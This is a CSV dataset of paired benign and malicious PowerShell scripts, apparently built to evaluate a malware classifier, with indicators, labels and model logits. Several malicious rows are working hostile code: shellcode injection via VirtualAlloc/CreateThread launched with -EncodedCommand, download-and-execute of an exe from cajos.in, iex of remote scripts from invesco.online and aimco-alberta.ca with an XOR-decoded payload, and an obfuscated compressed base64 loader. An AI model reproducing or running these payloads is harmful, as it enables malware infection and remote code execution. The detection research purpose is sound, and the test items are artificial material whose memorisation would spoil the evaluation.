filename,label,source,primary_indicator,matched_indicators,indicator_count,has_indicator,raw_char_len,used_char_len,was_truncated,content,pair_idx,pair_role,pair_indicator,correct,predicted_label,logit_diff
1735.ps1,benign,natural_overlap,-EncodedCommand,-EncodedCommand|Start-Process,2,True,952,952,False,"param(
    $ETLFileName = '.\PerfViewData.etl',

    [Parameter(Mandatory)]
    [scriptblock]
    $ScriptBlock,

    $LogFileName = '.\perfview.log',
    $PowerShellPath = $(Get-Command -Name pwsh.exe).Source,
    $PerfViewPath = $(Get-Command -Name PerfView.exe).Source
)

$EncodedScriptBlock = [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes($ScriptBlock.ToString()))
$perfViewArgs = @(
    '/AcceptEula'
    '/ThreadTime'
    ""/LogFile=$LogFileName""
    ""/DataFile:$ETLFileName""
    '/noRundown'
    '/Merge'
    '/Zip:False'


    '/Providers:*Microsoft-PowerShell-Runspaces,*Microsoft-PowerShell-CommandDiscovery,*Microsoft-PowerShell-Parser,*Microsoft.Windows.PowerShell'
    'run'
    """"""$PowerShellPath""""""
    '-NoProfile'
    '-EncodedCommand'
    $EncodedScriptBlock
)

$process = Start-Process -FilePath $PerfViewPath -ArgumentList $perfViewArgs -PassThru
$process.WaitForExit()

Get-Content $LogFileName | Out-Host",1,benign,-EncodedCommand,True,benign,-1.84375
3321.ps1,malicious,natural_overlap,-EncodedCommand,IEX|-EncodedCommand|VirtualAlloc,7,True,2527,2527,False,"$EXRGL9 = '$cSE = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $cSE -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x5d,0x03,0x93,0x78,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ZIA=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ZIA.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ZIA,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($EXRGL9));$EXRG = ""-EncodedCommand "";if([IntPtr]::Size -eq 8){$w8jB = $env:SystemRoot + ""\syswow64\WindowsPowerShell\v1.0\powershell"";iex ""& $w8jB $EXRG $e""}else{;iex ""& powershell $EXRG $e"";}",1,malicious,-EncodedCommand,True,malicious,3.890625
2670.ps1,benign,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,975,975,False,"function Install-PowerShellPackageManagement {





if (!(Get-command -Module PowerShellGet).count -gt 0)
    {

        $x86 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x86.msi'
        $x64 = 'https://download.microsoft.com/download/4/1/A/41A369FA-AA36-4EE9-845B-20BCC1691FC5/PackageManagement_x64.msi'

    switch ($env:PROCESSOR_ARCHITECTURE)
    {
        'x86' {$version = $x86}
        'AMD64' {$version = $x64}
    }

    $Request = [System.Net.WebRequest]::Create($version)
    $Request.Timeout = ""100000000""
    $URL = $Request.GetResponse()
    $Filename = $URL.ResponseUri.OriginalString.Split(""/"")[-1]
    $url.close()
    $WC = New-Object -TypeName System.Net.WebClient
    $WC.DownloadFile($version,""$env:TEMP\$Filename"")
    $WC.Dispose()

    msiexec.exe /package ""$env:TEMP\$Filename""

    Start-Sleep 80
    Remove-Item ""$env:TEMP\$Filename""
    }
}

Install-PowerShellPackageManagement


       ",2,benign,DownloadFile,True,benign,-1.453125
137.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,110,110,False,"(New-Object System.Net.WebClient).DownloadFile('http://cajos.in/0x/1.exe','mess.exe');Start-Process 'mess.exe'",2,malicious,DownloadFile,True,malicious,5.046875
1113.ps1,benign,natural_overlap,DownloadString,DownloadString|Net.WebClient,2,True,2146,2146,False,"$siteName = 'DefaultDocument'
$sitePort = 4387
$webConfigPath = Join-Path $TestDir web.config

function Start-TestFixture
{
    & (Join-Path -Path $PSScriptRoot -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)

    Install-IisAppPool -Name $siteName
}

function Stop-TestFixture
{
    Uninstall-IisAppPool -Name $siteName
}

function Start-Test
{
    Uninstall-IisWebsite $siteName
    Install-IisWebsite -Name $siteName -Path $TestDir -Bindings ""http://*:$sitePort"" -AppPoolName $siteName
    if( Test-Path $webConfigPath -PathType Leaf )
    {
        Remove-Item $webConfigPath
    }
}

function Stop-Test
{
    Uninstall-IisWebsite $siteName
}

function Test-ShouldAddDefaultDocument
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-DefaultDocumentReturned
    Assert-FileDoesNotExist $webConfigPath ""Settings were made in site web.config, not apphost.config.""
}

function Test-ShouldAddDefaultDocumentTwice
{
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Add-IISDefaultDocument -Site $SiteName -FileName 'NewWebsite.html'
    Assert-NoError
    $section = Get-IisConfigurationSection -SiteName $SiteName -SectionPath 'system.webServer/defaultDocument'
    Assert-NotNull $section
    Assert-Is ($section.GetCollection('files') | Where-Object { $_['value'] -eq 'NewWebsite.html' }) ([Microsoft.Web.Administration.ConfigurationElement])
    Assert-DefaultDocumentReturned
}

function Assert-DefaultDocumentReturned()
{
    $html = ''
    $maxTries = 10
    $tryNum = 0
    $defaultDocumentReturned = $false
    do
    {
        try
        {    
            $browser = New-Object Net.WebClient
            $html = $browser.downloadString( ""http://localhost:$sitePort/"" )
            Assert-Like $html 'NewWebsite Test Page' 'Unable to download from new website.'   
            $defaultDocumentReturned = $true
        }
        catch
        {
            Start-Sleep -Milliseconds 100
        }
        $tryNum += 1
    }
    while( $tryNum -lt $maxTries -and -not $defaultDocumentReturned )
    
    Assert-True $defaultDocumentReturned ""Default document never returned.""
}",3,benign,DownloadString,True,benign,-3.390625
450.ps1,malicious,natural_overlap,DownloadString,IEX|DownloadString|Net.WebClient,3,True,75,75,False,iex (new-object net.webclient).downloadstring('https://invesco.online/aaa'),3,malicious,DownloadString,True,malicious,1.34375
1238.ps1,benign,natural_overlap,FromBase64String,FromBase64String,1,True,288,288,False,"[CmdletBinding()]
param(
    [Parameter(Mandatory=$true)]
    [string]
    $Name
)

Set-StrictMode -Version 'Latest'

$Name = [Text.Encoding]::Unicode.GetString( [Convert]::FromBase64String($Name) ) 
[Environment]::SetEnvironmentVariable( $Name, $null, [EnvironmentVariableTarget]::User )",4,benign,FromBase64String,True,benign,-1.078125
3537.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String|DownloadString|Net.WebClient,6,True,282,282,False,$i = 0; $k = '1234'; IEX((New-Object Net.WebClient).DownloadString('https://cra.aimco-alberta.ca/is.txt'));Test-Querty -Querty ([Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('https://cra.aimco-alberta.ca/pl.txt')) | %{ $_ -bXor $k[$i++ % $k.length] }) -Force,4,malicious,FromBase64String,True,malicious,0.515625
1670.ps1,benign,natural_overlap,FromBase64String,FromBase64String,1,True,498,498,False,"function ConvertTo-Bytes {
    param (
        [string]$file
    )

    if (!$file -or !(Test-Path $file)) {
        throw ""file not found: '$file'""
    }

    [convert]::ToBase64String((Get-Content $file -Encoding Byte))
}

function ConvertFrom-Bytes {
    param (
        [string]$bytes,
        [string]$savepath
    )

    $dir = Split-Path $savepath
    if (!(Test-Path $dir)) {
        md $dir | Out-Null
    }

    [convert]::FromBase64String($bytes) | Set-Content $savepath -Encoding Byte
}",5,benign,FromBase64String,True,benign,-4.765625
3780.ps1,malicious,natural_overlap,FromBase64String,IEX|FromBase64String,2,True,499,499,False,"sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('TY9NawIxFEX3gv8hDC5ayiRCWxcDImWK4EZLS+lCu5hJ3micTDImL/Px7/t0U5ePe+7hvoct9OmuPINE9jUGhIZvAfkPlLnRYPGRf3g3jDz3oOjUhQlsyfZ36H+SF/IEv1n2DlURDVLYO1/fNaeT6WQWvSFDckJsQyaEMlx515ZuiAG8dBYJ5tI1Iog+wGsXnkdVN+fLcRCV8+to36yiTZVGXi5eVsos5wlpK22AvDOwXUbTWvbEkkNTGC21i+GKErWxnashpe8+4RIhIEu/vWa3Teku4voquan+AA=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()",5,malicious,FromBase64String,True,malicious,1.0625
